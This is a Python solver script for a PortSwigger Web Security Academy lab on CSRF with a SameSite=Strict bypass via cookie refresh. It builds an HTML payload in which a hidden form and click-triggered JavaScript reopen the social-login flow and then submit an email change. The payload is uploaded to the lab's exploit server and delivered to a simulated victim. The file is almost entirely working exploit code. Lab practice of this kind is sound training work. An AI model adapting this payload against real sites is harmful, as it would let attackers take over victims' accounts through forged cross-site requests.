import requests
from urllib3.exceptions import InsecureRequestWarning
from time import sleep
from bs4 import BeautifulSoup
from string import Template
import urllib
import re
import base64
import json


requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)

# lab_url: https://portswigger.net/web-security/csrf/bypassing-samesite-restrictions/lab-samesite-strict-bypass-via-cookie-refresh
# author: 0xyf


class CSRF10:
    def __init__(self):
        self.lab_id = "0a4d00ac030fb2fc808dd5b4007f0047"
        self.proxies = {"https": "http://127.0.0.1:8080"}

        self.url = f"https://{self.lab_id}.web-security-academy.net"
        self.sso_login_url = f"{self.url}/social-login"
        self.chg_email_url = f"{self.url}/my-account/change-email"

    def get_exploit_srv_url(self):
        r = requests.get(self.url)
        soup = BeautifulSoup(r.text, "html.parser")
        self.exploit_srv_url = soup.find("a", id="exploit-link").get("href")

    def execute_request(self, data):
        r = requests.post(
            f"{self.exploit_srv_url}",
            data=data,
            proxies=self.proxies,
            verify=False,
        )
        return r

    def csrf(self):
        self.get_exploit_srv_url()
        payload = Template(
            """<form method="POST" action="$chg_email_url">
            <input type="hidden" name="email" value="0xyf@0xyf.local">
            </form>
            <p>Click anywhere on the page</p>
            <script>
                window.onclick = () => {
                    window.open('$sso_login_url');
                    setTimeout(changeEmail, 5000);
                }

                function changeEmail() {
                    document.forms[0].submit();
                }
                </script>"""
        )

        payload = payload.substitute(
            chg_email_url=self.chg_email_url,
            sso_login_url=self.sso_login_url,
        )
        data = {
            "urlIsHttps": "on",
            "responseFile": "/exploit",
            "responseHead": "HTTP/1.1 200 OK\r\nContent-Type: text/html; charset=utf-8",
            "formAction": "DELIVER_TO_VICTIM",
            "responseBody": payload,
        }
        r = self.execute_request(data)

    def check_solved(self):
        sleep(5)
        r = requests.get(self.url)
        if "Congratulations, you solved the lab!" in r.text:
            print("Lab Solved")
        else:
            print("Did not solve lab, check payload")

    def solve(self):
        self.csrf()
        self.check_solved()


def main():
    CSRF10().solve()


if __name__ == "__main__":
    main()
